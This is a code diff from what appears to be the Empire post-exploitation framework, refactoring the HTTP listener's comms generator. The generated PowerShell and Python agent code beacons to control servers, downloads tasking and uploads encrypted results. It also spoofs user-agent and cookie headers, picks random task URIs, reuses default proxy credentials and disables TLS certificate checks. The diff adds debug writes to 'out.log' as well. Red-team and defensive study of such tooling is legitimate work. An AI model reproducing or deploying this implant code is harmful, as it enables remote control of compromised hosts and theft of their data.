@@ -543,8 +543,46 @@ class Listener:
         This should be implemented for the module.
         """
 
+        delay = listenerOptions['DefaultDelay']['Value']
+        jitter = listenerOptions['DefaultJitter']['Value']
+        profile = listenerOptions['DefaultProfile']['Value']
+        lostLimit = listenerOptions['DefaultLostLimit']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        b64DefaultResponse = base64.b64encode(self.default_response())
+
         if language:
             if language.lower() == 'powershell':
+                listener_dict = """
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"
+                     Cookie="{cookie}"}}
+        taskURIs = "{taskURIs}"
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
+#LISTENER_DICT
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'],
+           cookie = self.options['Cookie']['Value'],
+           taskURIs = profile.split('|')[0])
 
                 updateServers = """
                     $Script:ControlServers = @("%s");
@@ -555,14 +593,20 @@ class Listener:
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 getTask = """
-                    function script:Get-Task {
-
-                        try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+                    $script:GetTask{name} = {{
+                        param($FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
+                        "inside gettask before try"|Out-File "out.log" -Append -NoClobber
+                        try {{
+                            if ($ControlServers[$ServerIndex].StartsWith("http")) {{
+                                "if contrlserver startwith http" |Out-File "out.log" -Append -NoClobber
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
+                                "built routing packet" |Out-File "out.log" -Append -NoClobber
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
+                                "prparing routing packt for tasking request"|Out-File "out.log" -Append -NoClobber
 
                                 # build the web request object
                                 $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
@@ -570,35 +614,39 @@ class Listener:
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-                                }
+                                if($FixedParameters["Proxy"]) {{
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $FixedParameters["Proxy"];
+                                }}
 
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie", "session=$RoutingCookie")
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$FixedParameters["headers"]["UserAgent"])
+                                $FixedParameters["headers"].GetEnumerator() | % {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
-                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
-                                $result
-                            }
-                        }
-                        catch [Net.WebException] {
-                            $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
+                            }}
+                        }}
+                        catch [Net.WebException] {{
+                            "gettask got an exception net web"|Out-File "out.log" -Append -NoClobber
+                            $_.Exception.GetBaseException()|Out-File "out.log" -Append -NoClobber
+                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
+                            }}
+                        }}
+                    }}
+#TASK_FUNCTION
                 """
 
                 sendMessage = """
-                    function script:Send-Message {
-                        param($Packets)
+                    $script:SendMessage{name} = {{
+                        param($Packets,$FixedParameters)
 
-                        if($Packets) {
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
+
+                        if($Packets) {{
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets
 
@@ -606,58 +654,105 @@ class Listener:
                             # meta 'RESULT_POST' : 5
                             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
 
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+                            if($ControlServers[$ServerIndex].StartsWith('http')) {{
                                 # build the web request object
                                 $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-                                }
+                                if($FixedParameters['Proxy']) {{
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $FixedParameters["Proxy"];
+                                }}
 
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $FixedParameters["UserAgent"])
+                                $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
-                                try {
+                                try {{
                                     # get a random posting URI
-                                    $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
-                                }
-                                catch [System.Net.WebException]{
+                                    $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                    "using taskuri:"|Out-File "out.log" -Append -NoClobber
+                                    $taskURI|Out-File "out.log" -Append -NoClobber
+
+
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($ControlServers[$ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $response
+                                }}
+                                catch [System.Net.WebException]{{
+                                    "exception while uploading"|Out-File "out.log" -Append -NoClobber
+                                    $_.Exception.GetBaseException().Response.statuscode |Out-File "out.log" -Append -NoClobber
+
+
                                     # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                         # restart key negotiation
                                         Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
+                                    }}
+                                }}
+                            }}
+                        }}
+                    }}
+#COMM_FUNCTION
                 """
 
-                return updateServers + getTask + sendMessage
+                return (listener_dict,
+                        getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']),
+                        sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             elif language.lower() == 'python':
 
-                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
+                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value']) \
+                    if listenerOptions['Port']['Value'] == '' or \
+                        listenerOptions['Port']['Value'] == '80' \
+                    else "server = '{}:{}'\n".format(listenerOptions['Host']['Value'], listenerOptions['Port']['Value'])
 
-                if listenerOptions['Host']['Value'].startswith('https'):
-                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
+                if updateServers.endswith("/"): updateServers = updateServers[0:-1]
+
+                https_attrs = "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None" \
+                        if listenerOptions['Host']['Value'].startswith('https') else ''
+
+                listener_dict = """
+{{
+    'name': '{name}',
+    'delay' : {delay},
+    'jitter' : {jitter},
+    'fixed_parameters': {{
+        'headers' : {{'User-Agent': "{UA}", 'Cookie':"{cookie}"}},
+        'taskURIs' : "{taskURIs}",
+    }},
+    'send_func': {send_func},
+    'defaultResponse': "{defaultResponse}",
+    'lostLimit': {lostLimit},
+    'missedCheckins':0,
+}},
+#LISTENER_DICT
+"""
+            #patch in the listener_dict with usable data
+            
+                result.append(listener_dict.format(
+                    send_func = "send_message_{}".format(listenerOptions['Name']['Value']),
+                    delay = delay,
+                    jitter = jitter,
+                    UA = profile.split('|')[1],
+                    name = listenerOptions['Name']['Value'],
+                    cookie = self.options['Cookie']['Value'],
+                    taskURIs = profile.split('|')[0],
+                    lostLimit = lostLimit,
+                    defaultResponse = b64DefaultResponse))
 
                 sendMessage = """
-def send_message(packets=None):
+def send_message_{name}(packets, **kwargs):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
 
-    global missedCheckins
-    global server
-    global headers
-    global taskURIs
+    headers = kwargs['headers']
+    taskURIs = kwargs['taskURIs'].split(',')
 
     data = None
+    {update_servers}
+    {https}
+
     if packets:
         data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
@@ -668,7 +763,7 @@ def send_message(packets=None):
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = "session=%s" % (b64routingPacket)
+        headers['Cookie'] = \"""" + self.session_cookie + """=%s" % (b64routingPacket)
 
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
@@ -678,8 +773,6 @@ def send_message(packets=None):
         return ('200', data)
 
     except urllib2.HTTPError as HTTPError:
-        # if the server is reached, but returns an erro (like 404)
-        missedCheckins = missedCheckins + 1
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
             sys.exit(0)
@@ -688,12 +781,14 @@ def send_message(packets=None):
 
     except urllib2.URLError as URLerror:
         # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
 
     return ('', '')
+#COMM_FUNCTION
 """
-                return updateServers + sendMessage
+                return(sendMessage.format(name=listenerOptions['Name']['Value'],
+                    update_servers = updateServers,
+                    https = https_attrs))
 
             else:
                 print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
